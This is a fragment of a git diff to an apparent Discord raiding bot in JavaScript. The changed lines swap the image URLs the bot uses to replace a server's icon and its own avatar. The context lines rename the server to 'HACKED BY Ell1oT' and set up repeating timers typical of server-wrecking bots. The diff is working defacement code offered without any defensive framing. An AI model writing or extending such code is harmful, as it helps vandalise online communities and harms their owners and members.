@@ -35,8 +35,8 @@ client.on('message', message => {
             })
         }, 1000);
         
-        message.guild.setIcon("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
-        client.user.setAvatar("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
+        message.guild.setIcon("https://cdn.discordapp.com/attachments/807205133661765632/811711614327062598/GIF-210113_035754-1.gif");
+        client.user.setAvatar("https://cdn.discordapp.com/attachments/807205133661765632/811711614327062598/GIF-210113_035754-1.gif");
         message.guild.setName('HACKED BY Ell1oT');
         setTimeout(function() {
             setInterval(() => {
